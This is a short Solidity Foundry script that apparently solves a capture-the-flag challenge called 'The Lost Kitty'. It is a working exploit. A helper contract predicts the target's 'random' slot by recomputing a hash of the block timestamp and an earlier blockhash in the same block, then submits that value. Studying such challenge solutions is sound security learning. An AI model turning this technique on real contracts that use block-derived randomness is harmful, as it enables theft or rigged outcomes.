// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
interface IHouse {
    function catFound() external view returns (bool);

    function isKittyCatHere(bytes32 _slot) external;
}

contract FindKitty {
    constructor(IHouse house) {
        bytes32 slot = keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));
        console.logBytes32(slot);
        house.isKittyCatHere(slot);
        require(house.catFound());
    }
}
contract TheLostKittyScript is Script {
    IHouse house;
    address player = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
    function setUp() public {
        house = IHouse(0xe6b728F17bd656c95Ed8d667195456B59D15B881);
    }
    function run() public {
        attack();
    }
    function attack() public {
        vm.startBroadcast(player);
        // vm.startPrank(player, player);
        new FindKitty(house);
    }
}
